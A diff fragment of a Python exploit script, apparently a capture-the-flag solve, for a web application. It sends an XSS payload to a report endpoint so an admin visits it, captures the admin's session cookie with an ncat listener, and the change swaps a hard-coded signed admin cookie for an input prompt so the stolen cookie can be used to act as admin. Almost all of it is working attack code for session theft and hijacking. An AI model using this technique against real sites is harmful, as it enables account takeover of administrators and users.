@@ -598,10 +598,10 @@ headers = {
     "Referer": url+f"/search?query={quote('I BELEIVE IT DOESNT WORK')}"
 }
 session.post(url+f"/api/report", headers=headers, data=xss)
-exit()
 
 # replace with correct one captured from ncat
-ADMIN_COOKIE = '2|1:0|10:1766673018|8:username|8:YWRtaW4=|cc65c9796777076da04584bd6bdf535a53da75b37e13caee275c6e6bcc7c5c58'
+# ADMIN_COOKIE = '2|1:0|10:1766673018|8:username|8:YWRtaW4=|cc65c9796777076da04584bd6bdf535a53da75b37e13caee275c6e6bcc7c5c58'
+ADMIN_COOKIE = input('ADMIN_COOKIE> ')
 admin_cookies = {
     "username": ADMIN_COOKIE
 }
